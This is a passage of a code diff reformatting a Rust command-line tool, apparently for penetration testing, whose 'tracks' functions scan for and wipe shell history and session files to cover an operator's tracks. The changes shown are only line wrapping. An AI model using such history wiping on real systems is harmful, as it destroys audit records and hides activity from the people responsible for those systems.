+            colored(&files.zsh.len().to_string(), YELLOW)
+        );
         for f in &files.zsh {
             let size = std::fs::metadata(f).map(|m| m.len()).unwrap_or(0);
             println!("        {} ({} bytes)", f.display(), size);
@@ -2296,7 +2590,10 @@ fn execute_tracks_scan() -> Result<(), String> {
     }
 
     if !files.fish.is_empty() {
-        println!("    {} Fish history files:", colored(&files.fish.len().to_string(), YELLOW));
+        println!(
+            "    {} Fish history files:",
+            colored(&files.fish.len().to_string(), YELLOW)
+        );
         for f in &files.fish {
             let size = std::fs::metadata(f).map(|m| m.len()).unwrap_or(0);
             println!("        {} ({} bytes)", f.display(), size);
@@ -2304,7 +2601,10 @@ fn execute_tracks_scan() -> Result<(), String> {
     }
 
     if !files.other.is_empty() {
-        println!("    {} Other shell history files:", colored(&files.other.len().to_string(), YELLOW));
+        println!(
+            "    {} Other shell history files:",
+            colored(&files.other.len().to_string(), YELLOW)
+        );
         for f in &files.other {
             let size = std::fs::metadata(f).map(|m| m.len()).unwrap_or(0);
             println!("        {} ({} bytes)", f.display(), size);
@@ -2336,7 +2636,11 @@ fn execute_tracks_clear(ctx: &CliContext) -> Result<(), String> {
     Output::warning("For authorized penetration testing only.");
     println!();
 
-    let mode = if secure { "Secure wipe (overwrite + truncate)" } else { "Quick clear (truncate only)" };
+    let mode = if secure {
+        "Secure wipe (overwrite + truncate)"
+    } else {
+        "Quick clear (truncate only)"
+    };
     Output::item("Mode", mode);
 
     if let Some(shell) = shell_filter {
@@ -2363,11 +2667,21 @@ fn execute_tracks_clear(ctx: &CliContext) -> Result<(), String> {
         if result.success {
             success_count += 1;
             total_bytes += result.bytes_cleared;
-            println!("    {} {} ({} bytes)", colored("[CLEARED]", GREEN), result.file.display(), result.bytes_cleared);
+            println!(
+                "    {} {} ({} bytes)",
+                colored("[CLEARED]", GREEN),
+                result.file.display(),
+                result.bytes_cleared
+            );
         } else {
             failed_count += 1;
             let err = result.error.as_deref().unwrap_or("unknown");
-            println!("    {} {} ({})", colored("[FAILED]", RED), result.file.display(), err);
+            println!(
+                "    {} {} ({})",
+                colored("[FAILED]", RED),
+                result.file.display(),
+                err
+            );
         }
     }
 
@@ -2413,21 +2727,36 @@ fn execute_tracks_sessions() -> Result<(), String> {
         if result.success {
             success_count += 1;
             total_bytes += result.bytes_cleared;
-            println!("    {} {} ({} bytes)", colored("[CLEARED]", GREEN), result.file.display(), result.bytes_cleared);
+            println!(
+                "    {} {} ({} bytes)",
+                colored("[CLEARED]", GREEN),
+                result.file.display(),
+                result.bytes_cleared
+            );
         } else {
             let err = result.error.as_deref().unwrap_or("unknown");
-            println!("    {} {} ({})", colored("[FAILED]", RED), result.file.display(), err);
+            println!(
+                "    {} {} ({})",
+                colored("[FAILED]", RED),
+                result.file.display(),
+                err
+            );
         }
     }
 
     println!();
-    Output::success(&format!("Cleared {} session files ({} bytes)", success_count, total_bytes));
+    Output::success(&format!(
+        "Cleared {} session files ({} bytes)",
+        success_count, total_bytes
+    ));
 
     Ok(())
 }
 
 fn execute_tracks_command(ctx: &CliContext) -> Result<(), String> {
-    let shell = ctx.flags.get("shell")
+    let shell = ctx
+        .flags
+        .get("shell")
         .map(|s| s.to_string())
         .unwrap_or_else(|| tracks::detect_shell());
 
@@ -2440,7 +2769,10 @@ fn execute_tracks_command(ctx: &CliContext) -> Result<(), String> {
 
     Output::info("Run this command to clear current session history:");
     println!();
-    println!("    {}", colored(&tracks::get_clear_session_command(&shell), GREEN));
+    println!(
+        "    {}",
+        colored(&tracks::get_clear_session_command(&shell), GREEN)
+    );
     println!();
 
     Output::info("All shells:");
